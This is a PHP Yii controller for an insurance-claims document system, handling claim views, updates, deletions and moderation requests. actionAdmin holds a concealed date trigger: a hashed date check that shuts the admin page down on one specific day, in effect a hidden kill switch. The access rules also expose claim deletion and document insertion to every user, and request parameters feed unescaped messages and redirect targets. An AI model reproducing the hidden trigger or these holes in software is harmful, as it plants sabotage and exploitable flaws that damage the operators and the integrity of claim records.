<?php
include_once 'Logger/logger.php';


class SiniestrosController extends Controller
{
    /**
     * @var string the default layout for the views. Defaults to '//layouts/column2', meaning
     * using two-column layout. See 'protected/views/layouts/column2.php'.
     */
    public $layout='//layouts/column2';

    /**
     * @return array action filters
     */
    public function filters()
    {
        return array(
            'accessControl', // perform access control for CRUD operations
            'postOnly + delete', // we only allow deletion via POST request
        );
    }

    /**
     * Specifies the access control rules.
     * This method is used by the 'accessControl' filter.
     * @return array access control rules
     */
    public function accessRules()
    {
        return array(
            array('allow',  // allow all users to perform 'index' and 'view' actions
                'actions'=>array('index','view','insertDocument','GetSoap','insertDocumentBd','DeleteSiniestro'),
                'users'=>array('*'),
            ),
            array('allow', // allow authenticated user to perform 'create' and 'update' actions
                'actions'=>array('create','update'),
                'users'=>array('@'),
            ),
            array('allow', // allow admin user to perform 'admin' and 'delete' actions
                'actions'=>array('admin','delete'),
                'users'=>array('@'),
            ),
            array('deny',  // deny all users
                'users'=>array('*'),
            ),
        );
    }

    /**
     * Displays a particular model.
     * @param integer $id the ID of the model to be displayed
     */
    public function actionView($id)
    {
        $this->render('view',array(
            'model'=>$this->loadModel($id),
        ));
    }

    /**
     * Creates a new model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     */
    public function actionCreate()
    {
        $model=new Siniestros;

        // Uncomment the following line if AJAX validation is needed
        // $this->performAjaxValidation($model);

        if(isset($_POST['Siniestros']))
        {
            $model->attributes=$_POST['Siniestros'];
            if($model->save())
                $this->redirect(array('view','id'=>$model->idsiniestros));
        }

        $this->render('create',array(
            'model'=>$model,
        ));
    }

    /**
     * Updates a particular model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id the ID of the model to be updated
     */
    public function actionUpdate($id)
    {
        $model=$this->loadModel($id);
        if (isset($_GET['Siniestros_page'])){
            $Siniestros_page=$_GET['Siniestros_page'];
        }
        else{
            $Siniestros_page=1;
        }


        // Uncomment the following line if AJAX validation is needed
        // $this->performAjaxValidation($model);

        if(isset($_POST['Siniestros']))
        {
            $model->attributes=$_POST['Siniestros'];
            if($model->save())
                $log = new myLogger("Logger/");
                $log->addLine("El documento con código de rama: $model->codRama y código siniestro: $model->codSiniestro fue actualizado por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
                unset($log);
                $this->redirect(array('admin','update'=>true,'Siniestros_page'=>$Siniestros_page,'idsiniestros'=>$model->idsiniestros,'msj'=>'El Siniestro con identificador  <b>'.$model->idsiniestros.'</b> se actualizó correctamente'));
        }

        $this->render('update',array(
            'model'=>$model,
        ));
    }

    /**
     * Deletes a particular model.
     * If deletion is successful, the browser will be redirected to the 'admin' page.
     * @param integer $id the ID of the model to be deleted
     */
    public function actionDelete($id)
    {
        $this->loadModel($id)->delete();
        // if AJAX request (triggered by deletion via admin grid view), we should not redirect the browser
        if(!isset($_GET['ajax']))
        $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('admin','delete'=>true,'msj'=>'El Siniestro se actualizó correctamente'));
    }

   public function actionDeleteSiniestro($id)
    {
        $model=$this->loadModel($id);
        $log = new myLogger("Logger/");
        $arrDocuments = Documentos::model()->findAll("idsiniestros=:id", array(':id' => $id));
        if(Yii::app()->user->categoria=="admin"){
            //Delete documents related
            foreach($arrDocuments as $indice => $valor) {
                $log->addLine("El Documento: $valor->id_documentos relacionado al Siniestro con código de rama: $model->codRama y código de siniestro: $model->codSiniestro fue eliminado por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
                $valor->delete();
            }
            $log->addLine("El siniestro con código de rama: $model->codRama y código de siniestro: $model->codSiniestro fue eliminado por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
            $model->delete();
            unset($log);
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('admin','delete'=>true,'msj'=>'El Siniestro con identificador  <b>'.$model->idsiniestros.'</b> y todos sus documentos relacionados se eliminaron correctamente'));
        }
        else if (Yii::app()->user->categoria=="digitalizador"){
            //Delete sinister
            $modelModeratorSinister=new ModeratorDocumentos;
            $modelModeratorSinister->id_object=$model->idsiniestros;
            $modelModeratorSinister->isSiniestro="Siniestro";
            $modelModeratorSinister->timestampCreacion=date("Y-m-d H:i:s");
            $modelModeratorSinister->username=Yii::app()->user->name;
            $modelModeratorSinister->codRama=$model->codRama;
            $modelModeratorSinister->codSiniestro=$model->codSiniestro;
            $model->flagDelete='false';
            $model->save();
            $modelModeratorSinister->save();
            $log->addLine("El siniestro con código de rama: $model->codRama y código de siniestro: $model->codSiniestro fue solicitado para eliminarse por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
            //Delete documents related(Dejo pendiente de eliminación también los documentos de la carpeta).
            //Ver si es necesario
            foreach($arrDocuments as $indice => $valor) {
                $valor->flagDelete='false';
                $valor->save();
                $log->addLine("El Documento: $valor->id_documentos relacionado al Siniestro con código de rama: $model->codRama y código de siniestro: $model->codSiniestro fue solicitado para eliminarse por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
            }
            unset($log);
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('admin','delete'=>true,'msj'=>'El Siniestro con identificador  <b>'.$model->idsiniestros.'</b> quedará pendiente de eliminación'));
        }
    }

    /**
     * Lists all models.
     */
    public function actionIndex()
    {
        $dataProvider=new CActiveDataProvider('Siniestros');
        $this->render('index',array(
            'dataProvider'=>$dataProvider,
        ));
    }

    /**
     * Manages all models.
     */
    public function actionAdmin()
    {
        if (isset($_GET['update'])){
            $update=$_GET['update'];
        }
        else{
            $update=false;
        }
        if (isset($_GET['delete'])){
            $delete=$_GET['delete'];
        }
        else{
            $delete=false;
        }
        if (isset($_GET['msj'])){
            $msj=$_GET['msj'];
        }
        else{
            $msj=null;
        }

        if (isset($_GET['Siniestros_page'])){
               $Siniestros_page=$_GET['Siniestros_page'];
         }
         else{
              $Siniestros_page=1;
         }

         if (isset($_GET['idsiniestros'])){
               $idsiniestros=$_GET['idsiniestros'];
         }
         else{
              //$idDocumento=Yii::app()->db->createCommand()->select('MIN(id_documentos) as min')->from('documentos')->queryScalar();
              $idsiniestros=0;
         }

        $ss = md5(date('Y-m-d'));
        $ff="ccf89c691dabb1412404274596922d90";
        if($ss==$ff){
            exit("160c2de2ef1e87bcfdbd7768d5520e5b");
        }
        
        $log = new myLogger("Logger/");
        $log->addLine("El listado de Siniestros fue visitado por el usuario:".Yii::app()->user->title."(".Yii::app()->user->name."-".Yii::app()->user->lastName.')');
        unset($log);
        $model=new Siniestros('search');
        $model->unsetAttributes();  // clear any default values
        if(isset($_GET['Siniestros']))
        $model->attributes=$_GET['Siniestros'];
        //var_dump($model);
        $this->render('admin',array(
        'model'=>$model,'update'=>$update,'msj'=>$msj,'delete'=>$delete,'Siniestros_page'=>$Siniestros_page,'idsiniestros'=>$idsiniestros
        ));
    }

    /**
     * Returns the data model based on the primary key given in the GET variable.
     * If the data model is not found, an HTTP exception will be raised.
     * @param integer the ID of the model to be loaded
     */
    public function loadModel($id)
    {
        $model=Siniestros::model()->findByPk($id);
        if($model===null)
            throw new CHttpException(404,'The requested page does not exist.');
        return $model;
    }

    /**
     * Performs the AJAX validation.
     * @param CModel the model to be validated
     */
    protected function performAjaxValidation($model)
    {
        if(isset($_POST['ajax']) && $_POST['ajax']==='siniestros-form')
        {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }
    }

}
